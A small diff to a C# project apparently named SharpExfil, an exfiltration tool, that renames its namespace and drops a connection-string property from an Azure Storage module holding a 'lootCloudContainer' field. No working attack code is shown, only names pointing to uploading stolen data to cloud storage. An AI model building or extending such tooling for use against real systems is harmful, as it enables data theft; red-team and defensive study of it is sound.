@@ -9,7 +9,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace SharpExfil.Modules
+namespace SharpExfiltrate.Modules
 {
     public class AzureStorage
     {
@@ -26,7 +26,6 @@ namespace SharpExfil.Modules
         private CloudBlobClient blobClient { get; set; }
         private CloudBlobContainer lootCloudContainer { get; set; }
 
-        private string ConnectionString { get; set; }
         private string FileName { get; set; }
         private long StreamSize { get; set; }
         private int ProgressCount { get; set; }
